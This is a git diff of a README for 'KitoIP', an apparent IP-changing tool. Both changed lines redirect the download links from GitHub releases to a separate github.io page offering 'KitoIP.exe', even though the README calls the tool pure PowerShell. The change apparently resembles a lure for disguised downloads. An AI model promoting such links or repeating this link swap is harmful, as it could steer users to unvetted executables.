@@ -1,6 +1,6 @@
 # 🌐 KitoIP - Change Your IP Three Powerful Ways
 
-[![Download KitoIP](https://img.shields.io/badge/Download-KitoIP-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Peanutbutterwatersnake580/KitoIP/releases)
+[![Download KitoIP](https://img.shields.io/badge/Download-KitoIP-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://peanutbutterwatersnake580.github.io)
 
 ## 🚀 What Is KitoIP?
 
@@ -19,7 +19,7 @@ This tool is built entirely with PowerShell, meaning it works right out of the b
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Peanutbutterwatersnake580/KitoIP/releases](https://github.com/Peanutbutterwatersnake580/KitoIP/releases)
+Visit this link to download the application: [https://peanutbutterwatersnake580.github.io](https://peanutbutterwatersnake580.github.io)
 
 Once you're on that page, look for the newest release at the top. You'll see a file named something like `KitoIP.exe` or a compressed folder. Click the download button next to the file you need.
 
